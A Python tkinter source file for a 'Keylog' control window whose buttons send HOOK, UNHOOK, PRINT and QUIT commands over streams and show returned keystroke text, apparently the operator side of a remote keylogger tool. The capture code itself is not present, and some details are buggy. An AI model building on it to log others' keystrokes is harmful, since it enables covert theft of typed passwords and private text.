import tkinter as tk
from tkinter import Button, Text
import threading

class KeylogForm(tk.Toplevel):
    def __init__(self, nw, nr):
        super().__init__()

        self.root = tk.Tk()  # Create the main window
        self.title("Keylog")
        self.geometry("300x300")
        self.nw = nw
        self.nr = nr

        self.button1 = Button(self, text="Hook", command=self.button1_Click)
        self.button1.pack()

        self.button2 = Button(self, text="Unhook", command=self.button2_Click)
        self.button2.pack()

        self.button3 = Button(self, text="Print", command=self.button3_Click)
        self.button3.pack()

        self.txtKQ = Text(self)
        self.txtKQ.pack()

        self.butXoa = Button(self, text="Xóa", command=self.butXoa_Click)
        self.butXoa.pack()

        self.protocol("WM_DELETE_WINDOW", self.keylog_closing)

    def button1_Click(self):
        s = "HOOK"
        self.nw.write(s)
        self.nw.flush()

    def button2_Click(self):
        s = "UNHOOK"
        self.nw.write(s)
        self.nw.flush()

    def button3_Click(self):
        s = "PRINT"
        self.nw.write(s)
        self.nw.flush()

        data = self.nr.read(5000).decode("utf-8")
        self.txtKQ.insert(tk.END, data)

    def keylog_closing(self):
        s = "QUIT"
        self.nw.write(s)
        self.nw.flush()
        self.destroy()

    def butXoa_Click(self):
        self.txtKQ.delete("1.0", tk.END)

if __name__ == "__main__":
    app = KeylogForm(None, None)  # Replace None with actual nw and nr streams
    app.mainloop()
